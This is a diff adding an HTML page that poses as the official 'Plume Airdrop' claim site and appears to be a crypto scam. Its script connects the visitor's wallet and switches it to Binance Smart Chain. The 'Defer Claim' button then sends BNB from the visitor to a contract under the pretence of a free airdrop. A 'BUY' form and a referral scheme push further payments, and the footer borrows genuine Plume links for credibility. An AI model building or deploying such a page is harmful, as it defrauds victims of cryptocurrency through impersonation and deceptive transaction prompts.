@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+    <title>Plume Airdrop</title>
+    <style>
+        body {
+            background-color: #FFF5EA;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+
+        .top-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            margin-bottom: 20px;
+        }
+
+        .plume-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .address-badge {
+            background: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #666;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .wallet-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .wallet-address {
+            display: inline-block;
+            background: #F5F5F5;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #666;
+            cursor: pointer;
+            margin: 10px auto;
+        }
+
+        .verified-icon {
+            width: 20px;
+            height: 20px;
+            background: #FF4500;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+
+        .title {
+            font-size: 32px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        .title i {
+            font-style: italic;
+            font-weight: normal;
+        }
+
+        .subtitle {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #444;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+
+        .option-label {
+            font-weight: bold;
+            margin: 10px 0;
+            color: #333;
+            font-size: 15px;
+            text-align: center;
+        }
+
+        .reward-card {
+            background: linear-gradient(135deg, #D83B01 0%, #FF6B3D 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .circle-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+        }
+
+        .amount {
+            font-size: 36px;
+            font-weight: 600;
+            margin: 10px 0;
+        }
+
+        .plume-text {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-left: 5px;
+        }
+
+        .info {
+            font-size: 13px;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .claim-button {
+    background: #000;
+    color: white;
+    border: none;
+    padding: 15px;
+    border-radius: 25px;
+    width: 100%;
+    font-size: 15px;
+    font-weight: 700; /* Bold weight */
+    font-family: 'Roboto', sans-serif; /* Font Roboto */
+    cursor: pointer;
+    margin: 20px 0;
+}
+
+
+
+        .info-text {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+
+        .why-defer {
+            font-weight: bold;
+            display: inline-block;
+            background: #F5F5F5;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            color: #666;
+            cursor: pointer;
+            margin: 10px auto;
+            text-decoration: none;
+        }
+        .why-defer:hover {
+    color: #000000; /* Warna sedikit lebih gelap saat hover */
+    text-decoration: none; /* Tetap tanpa garis bawah saat hover */
+}
+
+        .dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #DDD;
+        }
+
+        .dot.active {
+            background: #666;
+        }
+        .logo-image {
+        width: 94px; /* Sesuaikan ukuran logo */
+        height: 32px; /* Sesuaikan ukuran logo */
+        }
+        .highlight {
+    font-weight: bold;
+}
+.circle-icon {
+    display: flex;
+    justify-content: center; /* Mengatur posisi gambar jika ada ruang ekstra */
+    align-items: flex-start; /* Mengatur posisi vertikal jika diperlukan */
+}
+
+.icon-image {
+    margin: 2px; /* Jarak 2px di setiap sisi */
+    position: relative; /* Agar bisa digeser */
+    top: -90px; /* Atur lebih atas, sesuaikan nilainya */
+    width: 60px; /* Sesuaikan ukuran gambar */
+    height: 60px; /* Sesuaikan ukuran gambar */
+    object-fit: contain; /* Menjaga rasio gambar tetap proporsional */
+}
+.footer {
+    background-color: #f8f3ef; /* Warna latar belakang footer */
+    padding: 20px 40px;
+    font-size: 14px;
+    color: #666;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+    text-align: left;
+}
+
+.footer-disclaimer {
+    font-size: 12px;
+    margin-bottom: 20px;
+    color: #999;
+}
+
+.footer-sections {
+    display: flex;
+    justify-content: space-between;
+}
+
+.footer-column h4 {
+    font-size: 16px;
+    margin-bottom: 10px;
+    color: #333;
+}
+
+.footer-column ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.footer-column ul li {
+    margin-bottom: 8px;
+}
+
+.footer-column ul li a {
+    color: #333;
+    text-decoration: none;
+}
+
+.footer-column ul li a:hover {
+    text-decoration: underline;
+}
+.footer-logo {
+    text-align: center;
+    margin-top: 40px;
+    margin-bottom: 20px;
+}
+
+.footer-logo-image {
+    width: 100px; /* Sesuaikan ukuran logo */
+    height: auto;
+    margin-bottom: 10px;
+}
+
+.footer-tagline {
+    font-size: 14px;
+    color: #333;
+    font-family: 'Times New Roman', Times, serif;
+}
+
+.footer-tagline .real-world {
+    font-weight: bold;
+    font-style: italic;
+    font-family: 'Times New Roman', Times, serif;
+}
+.footer-column ul {
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+
+.footer-column ul li {
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+}
+
+.footer-column ul li a {
+    color: #333;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+}
+
+.footer-column ul li a:hover {
+    text-decoration: underline;
+}
+
+.footer-column ul li a .icon {
+    width: 16px; /* Sesuaikan ukuran ikon */
+    height: 16px; /* Sesuaikan ukuran ikon */
+    margin-right: 8px; /* Jarak antara ikon dan teks */
+}
+.bnb-icon {
+    width: 16px; /* Ukuran logo BNB */
+    height: 16px;
+    margin-right: 1px; /* Jarak antara logo dan teks */
+    position: relative; /* Membolehkan penggunaan properti top */
+    top: 3px; /* Geser sedikit ke bawah */
+}
+
+
+
+
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="plume-logo">
+            <img src="/img/logo.png" alt="Logo" class="logo-image">
+            <span>Airdrop</span>
+        </div>
+        
+        <div class="address-badge">
+            <img src="/img/bnb.png" class="bnb-icon"> <span id="short-address">Loading...</span>
+        </div>
+        
+        <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+        <script>
+            // Fungsi untuk mempersingkat alamat Ethereum
+            function shortenAddress(address, startChars = 6, endChars = 4) {
+                return `${address.substring(0, startChars)}-${address.substring(address.length - endChars)}`;
+            }
+        
+            // Fungsi untuk meminta address dari wallet pengguna
+            async function connectWallet() {
+                if (typeof window.ethereum !== 'undefined') {
+                    try {
+                        // Meminta izin untuk mengakses wallet pengguna
+                        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                        const userAddress = accounts[0]; // Ambil address pertama dari wallet
+                        const shortAddress = shortenAddress(userAddress);
+        
+                        // Menampilkan alamat yang telah dipersingkat
+                        document.getElementById('short-address').textContent = shortAddress;
+                    } catch (error) {
+                        console.error("Failed to Connect Your Wallet:", error);
+                        document.getElementById('short-address').textContent = "Connection Failed";
+                    }
+                } else {
+                    console.error("Please Open in your Dapps Browser BitgetWallet or Trustwallet browser");
+                    document.getElementById('short-address').textContent = "No Wallet Found";
+                }
+            }
+        
+            // Panggil fungsi untuk menghubungkan wallet pengguna
+            connectWallet();
+        </script>
+                
+    </div>
+
+    <div class="container">
+        <div class="wallet-section">
+            <div class="wallet-address">
+                <span id="wallet-address-text">Loading...</span>
+                <div class="verified-icon" id="verified-icon" style="display: none;">✓</div>
+            </div>
+            
+            <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+            <script>
+                // Fungsi untuk mempersingkat alamat Ethereum
+                function shortenAddress(address, startChars = 6, endChars = 4) {
+                    return `${address.substring(0, startChars)}-${address.substring(address.length - endChars)}`;
+                }
+            
+                // Fungsi untuk meminta address dari wallet pengguna
+                async function connectWallet() {
+                    if (typeof window.ethereum !== 'undefined') {
+                        try {
+                            // Meminta izin untuk mengakses wallet pengguna
+                            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                            const userAddress = accounts[0]; // Ambil address pertama dari wallet
+                            const shortAddress = shortenAddress(userAddress);
+            
+                            // Perbarui elemen HTML dengan address yang dipersingkat
+                            document.getElementById('wallet-address-text').textContent = shortAddress;
+            
+                            // Tampilkan ikon terverifikasi
+                            document.getElementById('verified-icon').style.display = 'inline-block';
+                        } catch (error) {
+                            console.error("Failed to Connect Your Wallet:", error);
+                            document.getElementById('wallet-address-text').textContent = "Connection Failed Please Open Link In your Dapps Browser BitgetWallet or Trustwallet";
+                        }
+                    } else {
+                        console.error("Please Open in your Dapps Browser BitgetWallet or Trustwallet browser.");
+                        document.getElementById('wallet-address-text').textContent = "No Wallet Found";
+                    }
+                }
+            
+                // Panggil fungsi untuk menghubungkan wallet pengguna
+                connectWallet();
+            </script>
+            
+        </div>
+
+        <h1 class="title">You're <i>Eligible</i></h1>
+        <p class="subtitle">
+            Congratulations, you've been awarded a <span class="highlight">$PLUME</span> allocation in Plume's Airdrop Season 1. Choose how you want to claim your allocation below.
+        </p>        
+
+        <p class="option-label">Option 1</p>
+        <div class="reward-card">
+            <div class="teks">Defer Claim</div><br><br><br><br>
+            <div class="amount">1,250<span class="plume-text">PLUME</span></div>
+            <div class="info">Includes 66% boosted rewards, claimable after mainnet</div>
+            <div class="circle-icon">
+                <img src="/img/plume.png" alt="Reward" class="icon-image">
+            </div>            
+        </div>
+
+        <div class="dots">
+            <div class="dot active"></div>
+            <div class="dot"></div>
+        </div>
+        <div style="text-align: center;">
+            <p class="why-defer" id="countdown-timer">Claim End on : 2024-02-17</p>
+        </div>
+        
+        <script>
+            function startCountdown(targetDate) {
+                const countdownElement = document.getElementById('countdown-timer');
+        
+                function updateCountdown() {
+                    const now = new Date().getTime();
+                    const distance = new Date(targetDate).getTime() - now;
+        
+                    if (distance <= 0) {
+                        countdownElement.textContent = "Claim period has ended.";
+                        clearInterval(interval);
+                        return;
+                    }
+        
+                    // Hitung hari, jam, menit, dan detik
+                    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        
+                    // Update teks elemen dengan waktu tersisa
+                    countdownElement.textContent = `Claim ends in : ${days}d ${hours}h ${minutes}m ${seconds}s`;
+                }
+        
+                // Update setiap detik
+                const interval = setInterval(updateCountdown, 1000);
+                updateCountdown();
+            }
+        
+            // Inisialisasi penghitung mundur ke 17 Februari 2024
+            startCountdown('2025-02-07T00:00:00');
+        </script>
+        
+
+        <a 
+            href="javascript:getAirdrop()" 
+            id="claimairdrop" 
+            onclick="getAirdrop()" 
+            class="claim-button" 
+            style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2;">
+            Defer Claim ( 1,250 PLUME )
+        </a>
+
+        <p class="info-text">Deferring your claim unlocks exclusive opportunities to benefit from RWAI while supporting Plume and the broader ecosystem.</p>
+
+        <div style="text-align: center;">
+            <a href="https://docs.plumenetwork.xyz/plume/plume-overview/architecture" class="why-defer" target="_blank" rel="noopener noreferrer">
+                Why Defer?
+            </a>
+        </div>
+    </div><br>
+    <div class="container">
+        <div class="reward-card">
+            <p style="margin-bottom: 20px; font-size: 1rem; color: #ffffff; text-align: center; font-family: 'Roboto', sans-serif; font-weight: bold;">
+                After claiming your tokens, Swap your tokens and earn more BNB<br><br>
+                Official Contract<br>
+                <span style="font-size: 12px; color: #ffffff;">0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b</span>
+            </p>           
+            
+            <button 
+                class="claim-button" 
+                onclick="window.location.href='/swap'" 
+                style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2;">
+                SWAP
+            </button>
+        </div>
+
+    </div>
+</div>  
+</div><br>
+<div class="container">
+    <div class="header">
+    </div>
+    <div class="reward-card" style="margin-bottom: 20px; font-size: 1rem; color: #666; text-align: center;">
+        <h4 style="margin-bottom: 10px; font-family: 'Roboto', sans-serif; font-weight: bold; color: #ffffff;">Buy PLUME</h4>
+<p style="margin-bottom: 20px; font-family: 'Roboto', sans-serif; color: #ffffff;">Min Buy 0.01 BNB = 1,500 PLUME</p>
+<p style="margin-bottom: 20px; font-family: 'Roboto', sans-serif; color: #ffffff;">Max Buy 5 BNB = 75,000,000 PLUME</p>
+
+        <input style="display:none" id="airinput" class placeholder="Invite By">
+        <input style="display:none" id="airdropval" class type="text" value="0.01">
+        <input 
+            style="margin-bottom:20px; background-color:white; color:black; border-radius:25px; padding:10px; border:1px solid #ccc; width:100%; box-sizing:border-box;" 
+            id="buyinput" 
+            class="input w-input" 
+            placeholder="Enter BNB" 
+            value="0.01">
+        <a style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2; margin-left: -10px;"
+ 
+            class="claim-button" 
+            href="javascript:buystt()">BUY</a>
+    </div>
+</div><br>
+
+
+<div class="container">
+    <div class="header">
+    </div>
+    <div class="reward-card" style="margin-bottom: 20px; font-size: 1rem; color: #666; text-align: center;">
+        <p style="font-family: 'Roboto', sans-serif; font-weight: bold; color: #ffffff;">Ref Will Get 100% PLUME + 80% BNB</p>
+
+        <input 
+        style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2; margin-left: -10px;"
+            id="refaddress" 
+            type="text" 
+            class="input w-input" 
+            required="required" 
+            placeholder="Enter Your EVM Address"><br><br>
+        
+        <a 
+            href="javascript:void(0)" 
+            style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2; margin-left: -10px;" 
+            class="claim-button" 
+            onclick="getreflink()">
+            Get Ref Link
+        </a><br>
+        
+        <a href="javascript:copyToClipboard('refaddress')" onclick="kopiraj()" style="display: inline-block; width: 100%; text-align: center; padding: 10px; border-radius: 25px; text-decoration: none; line-height: 2; margin-left: -10px;" class="claim-button">Copy</a>
+    </div>
+</div>
+
+
+  <script src="js/jquery.js" type="text/javascript" crossorigin="anonymous"></script>
+<script src="js/main_1.js" type="text/javascript"></script>
+<script src="js/web3.js" type="text/javascript"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+<script>
+let addr, web3 = new web3js.myweb3(window.ethereum);
+let n = document.getElementById("airinput").value;
+const sttaddr = "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b";
+const sttaddr1 = "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b";
+const bscChainId = 56; // Chain ID Binance Smart Chain
+const bscRpcUrl = "https://bsc-rpc.publicnode.com";
+
+sttabi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"stateMutability":"nonpayable","type":"fallback"},{"inputs":[{"internalType":"address","name":"liquidity_","type":"address"}],"name":"Liquidity","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"addLiquidity","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"airdrop","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"owner_","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"num","type":"uint256"}],"name":"authNum","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner_","type":"address"},{"internalType":"uint8","name":"black_","type":"uint8"}],"name":"black","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_refer","type":"address"}],"name":"buy","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"cap","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"clearETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getBlock","outputs":[{"internalType":"bool","name":"swAirdorp","type":"bool"},{"internalType":"bool","name":"swSale","type":"bool"},{"internalType":"uint256","name":"sPrice","type":"uint256"},{"internalType":"uint256","name":"sMaxBlock","type":"uint256"},{"internalType":"uint256","name":"nowBlock","type":"uint256"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"airdropEth","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"ah","type":"address"},{"internalType":"address","name":"ah2","type":"address"}],"name":"setAuth","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint8","name":"tag","type":"uint8"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"update","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
+let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
+let sttcontract1 = new web3.eth.Contract(sttabi, sttaddr1);
+
+const loadweb3 = async () => {
+try {
+  web3 = new web3js.myweb3(window.ethereum);
+  console.log("Injected web3 detected.");
+  sttcontract = new web3.eth.Contract(sttabi, sttaddr);
+  sttcontract1 = new web3.eth.Contract(sttabi, sttaddr1);
+  let e = await ethereum.enable();
+  return (addr = web3.utils.toChecksumAddress(e[0]));
+} catch (e) {
+  if (e.code === 4001) {
+      console.log("Please connect to MetaMask.");
+  } else {
+      Swal.fire(
+          "Connect Alert",
+          "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
+          "error"
+      );
+  }
+}
+};
+
+const switchToBSC = async () => {
+try {
+  await window.ethereum.request({
+      method: "wallet_addEthereumChain",
+      params: [
+          {
+              chainId: "0x38", // 56 in hexadecimal
+              chainName: "Binance Smart Chain",
+              nativeCurrency: {
+                  name: "Binance Coin",
+                  symbol: "BNB",
+                  decimals: 18,
+              },
+              rpcUrls: [bscRpcUrl],
+              blockExplorerUrls: ["https://bscscan.com"],
+          },
+      ],
+  });
+} catch (error) {
+  console.error("Failed to switch to Binance Smart Chain:", error);
+}
+};
+
+const getAirdrop = async () => {
+    try {
+        await loadweb3();
+        const currentChainId = await web3.eth.getChainId();
+
+        if (currentChainId !== bscChainId) {
+            Swal.fire(
+                "Network Alert",
+                "Please switch to Binance Smart Chain to claim the airdrop.",
+                "error"
+            );
+            await switchToBSC();
+            return;
+        }
+
+        if (!addr) {
+            Swal.fire(
+                "Connect Alert",
+                "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
+                "error"
+            );
+            return;
+        }
+
+        // Cek saldo pengguna
+        const balanceWei = await web3.eth.getBalance(addr);
+        const balanceBNB = web3.utils.fromWei(balanceWei, "ether");
+        console.log("User balance:", balanceBNB, "BNB");
+
+        if (parseFloat(balanceBNB) < 0.006) {
+            Swal.fire(
+                "Insufficient Balance",
+                "You need at least 0.006 BNB to claim the airdrop.",
+                "error"
+            );
+            return;
+        }
+
+        // Nilai untuk klaim airdrop
+        airdropval.value = "0.005";
+        let t = document.getElementById("airdropval").value;
+        t = web3.utils.toWei(t, "ether");
+
+        if (!n || n === "") {
+            n = "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b";
+        }
+
+        sttcontract.methods.airdrop(n).send(
+            {
+                from: addr,
+                value: t,
+                gasLimit: 100000,
+            },
+            (error, txHash) => {
+                if (error) {
+                    console.error("Transaction error:", error);
+                    Swal.fire(
+                        "Transaction Failed",
+                        "An error occurred during the transaction. Please try again.",
+                        "error"
+                    );
+                } else {
+                    console.log("Transaction successful:", txHash);
+                    Swal.fire(
+                        "Success",
+                        "Airdrop claimed successfully. Transaction hash: " + txHash,
+                        "success"
+                    );
+                }
+            }
+        );
+
+        Swal.fire({
+            title: "Transaction Confirmation",
+            html: "Please confirm the transaction to receive the airdrop.",
+            timer: 2000,
+            didOpen: () => {
+                Swal.showLoading();
+            },
+        });
+    } catch (error) {
+        console.error("Unexpected error:", error);
+        Swal.fire(
+            "Connect Alert",
+            "Please install Metamask, or paste URL link into Bitget Wallet Dapps or Trustwallet (Dapps)...",
+            "error"
+        );
+    }
+};
+
+const buystt = async () => {
+const check = await web3.eth.getChainId();
+await loadweb3();
+null == addr &&
+  Swal.fire(
+      "Connect Alert",
+      "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
+      "error"
+  );
+if (check !== bscChainId) {
+  Swal.fire(
+      "Network Alert",
+      "Please switch to Binance Smart Chain to buy tokens.",
+      "error"
+  );
+  await switchToBSC();
+  return;
+}
+
+let timerInterval;
+Swal.fire({
+  title: "Transaction confirmation!",
+  html: "Please confirm the transaction before receiving the Token!.",
+  timer: 2000,
+  didOpen: () => {
+      Swal.showLoading();
+      const b = Swal.getHtmlContainer().querySelector("b");
+      timerInterval = setInterval(() => {}, 100);
+  },
+  willClose: () => {
+      clearInterval(timerInterval);
+  },
+}).then((result) => {});
+
+let e = document.getElementById("buyinput").value;
+if (e >= 0.01) {
+  e = 1e18 * Number(e);
+  let t = document.getElementById("airinput").value;
+  "" === t && (t = "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b");
+  sttcontract.methods.buy(t).send(
+      {
+          from: addr,
+          value: e,
+          gasLimit: 100000,
+      },
+      (e, t) => {
+          e ? console.log(e) : console.log(t);
+      }
+  );
+} else
+  Swal.fire("Buy Alert", "Buy as low as 0.01 BNB.", "error");
+};
+
+const cooldowncheck = async () => {
+let e = await currentblock(),
+  t = await lastblock();
+if (e - t < 50) {
+  console.log(e, t);
+  let n = 50 + t - e;
+  return (
+      console.log(n),
+      alert(
+          "You must wait " +
+              n +
+              " blocks before claiming another airdrop"
+      ),
+      !1
+  );
+}
+return !0;
+};
+
+const currentblock = async () => {
+let e;
+return (
+  await web3.eth.getBlockNumber((t, n) => {
+      e = n;
+  }),
+  e
+);
+};
+
+const lastblock = async () => {
+let e;
+return (
+  await sttcontract.methods.lastairdrop(addr).call((t, n) => {
+      e = n;
+  }),
+  e
+);
+};
+
+const getbalance = async (e) => {
+let t;
+await sttcontract.methods.balanceOf(e).call((e, n) => {
+  t = n;
+});
+return Promise.reHLOe(t);
+};
+
+function calculate() {
+var e = 1e6 * document.getElementById("buyinput").value;
+console.log(e),
+  (document.getElementById("buyhch2input").value = e.toLocaleString(
+      "en-US"
+  ));
+}
+
+function addToWallet() {
+try {
+  web3.currentProvider.sendAsync(
+      {
+          method: "wallet_watchAsset",
+          params: {
+              type: "ERC20",
+              options: {
+                  address: "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b",
+                  symbol: "OGN",
+                  decimals: "18",
+                  image: "",
+              },
+          },
+          id: Math.round(1e5 * Math.random()),
+      },
+      function (e, t) {
+          e
+              ? console.log(e.message)
+              : t.result
+              ? console.log("Token added")
+              : (console.log(t), console.log("Some error"));
+      }
+  );
+} catch (e) {
+  console.log(e);
+}
+}
+
+window.onload = function () {
+var e = function (e) {
+  for (
+      hu = window.location.search.substring(1),
+          gy = hu.split("&"),
+          i = 0;
+      i < gy.length;
+      i++
+  )
+      if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
+}("ref");
+null == e || (document.getElementById("airinput").value = e);
+};
+
+var countDownDate = new Date("Jan 30, 2025 00:00:00 UTC").getTime(),
+x = setInterval(function () {
+  var e = new Date().getTime(),
+      t = countDownDate - e,
+      n = Math.floor(t / 864e5),
+      a = Math.floor((t % 864e5) / 36e5),
+      o = Math.floor((t % 36e5) / 6e4),
+      l = Math.floor((t % 6e4) / 1e3);
+  t < 0
+      ? (clearInterval(x),
+        (document.getElementById("demo").innerHTML = "EXPIRED"))
+      : (document.getElementById("demo").innerHTML =
+            n +
+            "d " +
+            a +
+            "h " +
+            o +
+            "m " +
+            l +
+            "s ");
+}, 1e3);
+                          
+                          function getreflink() {
+                          var e = document.getElementById("refaddress").value;
+                          document.getElementById("refaddress").value ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e) ? document.getElementById("refaddress").value = "https://plumeclaim.netlify.app/?ref=" + document.getElementById("refaddress").value : Swal.fire("Referral Alert", "Your address is not valid.", "error") : Swal.fire("Referral Alert", "Please Enter Your EVM- Address.", "error")
+                          }
+                          
+                          function copyToClipboard(e) {
+                          var t = document.getElementById(e).value;
+                          if (window.clipboardData && window.clipboardData.setData) return clipboardData.setData("Text", t);
+                          if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
+                            var n = document.createElement("textarea");
+                            n.textContent = t, n.style.position = "fixed", document.body.appendChild(n), n.select();
+                            try {
+                            return document.execCommand("copy")
+                            } catch (e) {
+                            return console.warn("Copy to clipboard failed.", e), !1
+                            } finally {
+                            document.body.removeChild(n)
+                            }
+                          }
+                          }
+                          
+                          function kopiraj() {
+                          document.getElementById("refaddress").select(), document.execCommand("Copy"), alert("Copied success.")
+                          }
+                          
+                          function querySt(e) {
+                          for (hu = window.location.search.substring(1), gy = hu.split("&"), i = 0; i < gy.length; i++)
+                            if (ft = gy[i].split("="), ft[0] == e) return ft[1]
+                          }
+                          var ref = querySt("ref");
+                          null == ref ? (ref = "0x2C1fd22F7b1B7B899B7db9Efa6F150C795A4874b", document.getElementById("airinput").value = ref) : document.getElementById("airinput").value = ref;
+              </script>
+      <link href="css/main.css" rel="stylesheet" type="text/css">
+    
+    
+    <footer class="footer">
+        <div class="footer-content">
+            <p class="footer-disclaimer">
+                <strong>Disclaimer:</strong> Terms of Service apply. Plume's Airdrop is available globally, excluding the United States and OFAC-sanctioned countries, in accordance with regulatory and compliance requirements.
+            </p>
+            <div class="footer-logo">
+                <img src="/img/logo.png" alt="Plume Logo" class="footer-logo-image">
+                <p class="footer-tagline">
+                    Bringing the <span class="real-world">real world</span> onchain
+                </p>
+            </div>
+            <div class="footer-sections">
+                <div class="footer-column">
+                    <h4>About Plume</h4>
+                    <ul>
+                        <li><a href="https://docs.plumenetwork.xyz/plume#about-us">About</a></li>
+                        <li><a href="https://plumenetwork.xyz/blog/airdrop">Plume Airdrop FAQ</a></li>
+                        <li><a href="https://plumenetwork.xyz/blog">Blog</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Legal</h4>
+                    <ul>
+                        <li><a href="https://plumenetwork.xyz/privacy-policy">Privacy Policy</a></li>
+                        <li><a href="https://registration.plumenetwork.xyz/terms">Airdrop Terms of Service</a></li>
+                        <li><a href="https://plumenetwork.xyz/terms-of-service">General Terms of Service</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h4>Community</h4>
+                    <ul>
+                        <li>
+                            <a href="https://x.com/plumenetwork">
